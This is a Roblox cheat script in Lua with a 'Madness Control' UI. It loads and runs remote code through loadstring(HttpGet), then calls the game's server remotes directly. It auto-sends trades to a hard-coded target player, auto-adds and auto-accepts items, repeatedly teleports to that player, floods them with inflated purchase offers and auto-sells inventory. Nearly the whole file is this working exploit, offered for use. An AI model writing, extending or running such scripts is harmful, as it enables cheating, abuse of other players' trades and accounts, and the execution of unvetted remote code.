local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local UIModule = require(game.ReplicatedStorage.Modules.UIModule)
local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
local Players = game:GetService("Players")
local CollectionService = game:GetService("CollectionService")
local LocalPlayer = Players.LocalPlayer
local RepLibrary = require(ReplicatedStorage.Modules.RepLibrary)
local ItemsModule = require(ReplicatedStorage.Modules.Items)

local MakeOfferRemote = Events.Shop.MakePlayerOffer
local GetRemote = Events.Data.Get
local SetInsideShopRemote = Events.Misc.SetInsideShop
local GetAllRemote = Events.Data.GetAll
local AcceptRemote = Events.Shop.AcceptPlayerOffer
local SellRemote = Events.Shop.SellItemInShop

local Window = Fluent:CreateWindow({
    Title = "Madness Control",
    SubTitle = "3 Toggles Only",
    TabWidth = 160,
    Size = UDim2.fromOffset(300, 250),
    Acrylic = true,
    Theme = "Dark"
})

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "home" })
}

local Config = {
    MadnessPlayer = "ANYASTOM20",
    PivotEnabled = false,
    SendOffersEnabled = false,
    MadnessEnabled = false,
    LastPivot = 0,
    LastSend = 0,
    PivotDelay = 5,
    SendDelay = 3
}

-- AutoTrade config preserved
_G.AutoTrade = {
    Enabled = true,
    TargetPlayers = {Config.MadnessPlayer},
    CurrentTargetIndex = 1,
    AutoSend = true,
    AutoAccept = false,
    AutoAdd = true,
    MinItems = 16,
    StopWhenCash = 2000000000,
    SendDelay = 5,
    LastSend = 0
}

local function getAllPlayers()
    local t = {}
    for _,p in ipairs(Players:GetPlayers()) do
        table.insert(t,p.Name)
    end
    return t
end

local function getMadnessPlayer()
    return Players:FindFirstChild(Config.MadnessPlayer)
end

local function updateTargetPlayers()
    _G.AutoTrade.TargetPlayers = {Config.MadnessPlayer}
    _G.AutoTrade.CurrentTargetIndex = 1
end

local function getCurrentTarget()
    return _G.AutoTrade.TargetPlayers[_G.AutoTrade.CurrentTargetIndex]
end

local function checkPlayerCash(playerName)
    local player = Players:FindFirstChild(playerName)
    if player and player:FindFirstChild("SaveVars") and player.SaveVars:FindFirstChild("Cash") then
        return player.SaveVars.Cash.Value
    end
    return nil
end

local function switchToNextTarget()
    if #_G.AutoTrade.TargetPlayers > 0 then
        _G.AutoTrade.CurrentTargetIndex = (_G.AutoTrade.CurrentTargetIndex % #_G.AutoTrade.TargetPlayers) + 1
        local newTarget = getCurrentTarget()
        UIModule:Notify(LocalPlayer, "Switched target to: " .. newTarget)
    end
end

local function getPlacedMap(plot)
    local map = {}
    local furniture = plot:FindFirstChild("Furniture")
    if not furniture then return map end
    for _, v in pairs(furniture:GetDescendants()) do
        if v.Name == "Item" then
            for _, item in pairs(v:GetChildren()) do
                map[item.Name] = map[item.Name] or {}
                table.insert(map[item.Name], item)
            end
        end
    end
    return map
end

local function loadPlayerShop(targetPlayer)
    if not targetPlayer then return end
    local vars = targetPlayer:FindFirstChild("NonSaveVars")
    if not vars then return end
    local plotVal = vars:FindFirstChild("OwnsPlot")
    if not plotVal then return end
    local plot = plotVal.Value
    if not plot then return end
    local floorVal = vars:FindFirstChild("DefaultFloor")
    if floorVal and floorVal.Value then
        pcall(function()
            SetInsideShopRemote:FireServer(nil)
            task.wait()
            SetInsideShopRemote:FireServer(floorVal.Value)
        end)
    end
end

local function pivotToTarget(targetPlayer)
    if not targetPlayer then return end
    local character = targetPlayer.Character
    if not character then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    local myCharacter = LocalPlayer.Character
    if root and myCharacter then
        myCharacter:PivotTo(root.CFrame * CFrame.new(0, 0, -3))
        loadPlayerShop(targetPlayer)
    end
end

Tabs.Main:AddDropdown("MadnessPlayer", {
    Title = "Madness Player",
    Values = getAllPlayers(),
    Multi = false,
    Default = "ANYASTOM20",
    Callback = function(v)
        Config.MadnessPlayer = v
        updateTargetPlayers()
        UIModule:Notify(LocalPlayer, "Madness player: " .. v)
    end
})

Tabs.Main:AddToggle("PivotToggle", {
    Title = "Pivot Teleport",
    Default = false,
    Callback = function(v)
        Config.PivotEnabled = v
        UIModule:Notify(LocalPlayer, "Pivot " .. (v and "ON" or "OFF"))
    end
})

Tabs.Main:AddToggle("SendOffersToggle", {
    Title = "Send Offers",
    Default = false,
    Callback = function(v)
        Config.SendOffersEnabled = v
        UIModule:Notify(LocalPlayer, "Send Offers " .. (v and "ON" or "OFF"))
    end
})

Tabs.Main:AddToggle("MadnessToggle", {
    Title = "Start Madness",
    Default = false,
    Callback = function(v)
        Config.MadnessEnabled = v
        _G.AutoTrade.Enabled = v
        UIModule:Notify(LocalPlayer, "Madness " .. (v and "STARTED" or "STOPPED"))
    end
})

-- Original AutoTrade loop with MinItems = 16 check
task.spawn(function()
    while true do
        task.wait(1)
        if _G.AutoTrade.Enabled and _G.AutoTrade.AutoSend and getCurrentTarget() and tick() - _G.AutoTrade.LastSend >= _G.AutoTrade.SendDelay then
            
            local currentTarget = getCurrentTarget()
            local targetCash = checkPlayerCash(currentTarget)
            
            if targetCash and targetCash >= _G.AutoTrade.StopWhenCash then
                UIModule:Notify(LocalPlayer, currentTarget .. " has $" .. targetCash .. " - Switching target")
                switchToNextTarget()
            else
                local data = Events.Data.Get:InvokeServer("Inventory")
                local inventory = data.Inventory or data
                local availableCount = 0
                
                for guid, itemData in pairs(inventory) do
                    if not (itemData.ItemPlaced or itemData.NextOfferDue) then
                        availableCount = availableCount + 1
                    end
                end
                
                if availableCount >= _G.AutoTrade.MinItems then
                    local success = Events.Trading.SendInvite:InvokeServer(currentTarget)
                    if success then
                        UIModule:Notify(LocalPlayer, "Sent trade to " .. currentTarget .. " (" .. availableCount .. " items)")
                        _G.AutoTrade.LastSend = tick()
                    end
                else
                    UIModule:Notify(LocalPlayer, "Not enough items: " .. availableCount .. "/" .. _G.AutoTrade.MinItems)
                end
            end
        end
    end
end)

Events.Trading.AcceptTradeFromServer.OnClientEvent:Connect(function()
    if _G.AutoTrade.Enabled and _G.AutoTrade.AutoAccept then
        task.wait(0.5)
        Events.Trading.AcceptTrade:InvokeServer()
        UIModule:Notify(LocalPlayer, "Trade Accepted")
    end
end)

task.spawn(function()
    while true do
        task.wait(2)
        if _G.AutoTrade.Enabled and _G.AutoTrade.AutoAdd then
            local data = Events.Data.Get:InvokeServer("Inventory")
            local inventory = data.Inventory or data
            local addedCount = 0
            
            for guid, itemData in pairs(inventory) do
                if addedCount >= 16 then
                    break
                end
                
                if not (itemData.ItemPlaced or itemData.NextOfferDue) then
                    local success = Events.Trading.AddItem:InvokeServer({
                        GUID = guid,
                        Type = "Item"
                    })
                    
                    if success then
                        addedCount = addedCount + 1
                    end
                    
                    task.wait(0.1)
                end
            end
            
            if addedCount > 0 then
                UIModule:Notify(LocalPlayer, "Added " .. addedCount .. " items")
                task.wait(0.5)
                Events.Trading.AcceptTrade:InvokeServer()
                UIModule:Notify(LocalPlayer, "Trade Accepted")
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.5)
        if not Config.PivotEnabled then continue end
        
        local target = getMadnessPlayer()
        if not target then continue end
        
        local now = tick()
        if now - Config.LastPivot >= Config.PivotDelay then
            pivotToTarget(target)
            Config.LastPivot = now
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(3)
        if not Config.SendOffersEnabled then continue end
        
        local target = getMadnessPlayer()
        if not target then continue end
        
        local inv = GetRemote:InvokeServer("Inventory", target)
        if type(inv) ~= "table" then continue end
        
        local plotVal = target.NonSaveVars and target.NonSaveVars.OwnsPlot
        if not plotVal then continue end
        
        local plot = plotVal.Value
        if not plot then continue end
        
        local placedMap = getPlacedMap(plot)
        
        local sortedItems = {}
        for guid, itemData in pairs(inv) do
            local price = RepLibrary:GetItemPrice(itemData)
            table.insert(sortedItems, {GUID = guid, Data = itemData, Price = price})
        end
        table.sort(sortedItems, function(a, b) return a.Price > b.Price end)
        
        for _, item in ipairs(sortedItems) do
            local guid = item.GUID
            local itemData = item.Data
            local info = ItemsModule[itemData.Id]
            if not info then continue end
            
            local placed = placedMap[info.Name]
            if placed and #placed > 0 then
                local instance = table.remove(placed, 1)
                local price = item.Price
                local offer = math.floor(price * 1.5)
                
                pcall(function()
                    MakeOfferRemote:InvokeServer(target, guid, offer, instance)
                end)
                task.wait(0.25)
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(5)
        if not Config.MadnessEnabled then continue end
        
        local data = GetAllRemote:InvokeServer()
        if not data or not data.Inventory then continue end
        
        local plotName = LocalPlayer.NonSaveVars.OwnsPlot.Value.Name
        local plot = workspace.Plots[plotName]
        
        local shelves = {}
        local furnitureFolder = plot:FindFirstChild("Furniture")
        if furnitureFolder then
            for _, furniture in ipairs(furnitureFolder:GetChildren()) do
                local s = furniture:FindFirstChild("Shelves")
                if s then
                    for _, shelf in ipairs(s:GetChildren()) do
                        table.insert(shelves, shelf)
                    end
                end
            end
        end
        
        local sortedInventory = {}
        for guid, info in pairs(data.Inventory) do
            local id = tonumber(info.Id)
            local itemData = ItemsModule[id]
            local name = itemData and string.lower(itemData.Name or "") or ""
            if id ~= 681 and id ~= 2294 and not string.find(name, "safe") then
                local price = RepLibrary:GetItemPrice(info)
                table.insert(sortedInventory, {GUID = guid, Data = info, Price = price})
            end
        end
        
        table.sort(sortedInventory, function(a, b) return a.Price > b.Price end)
        
        local shelfIndex = 1
        for _, item in ipairs(sortedInventory) do
            if shelfIndex > #shelves then break end
            pcall(function()
                SellRemote:FireServer(item.GUID, shelves[shelfIndex], true)
            end)
            shelfIndex = shelfIndex + 1
            task.wait(0.15)
        end
    end
end)

Window:SelectTab(Tabs.Main)
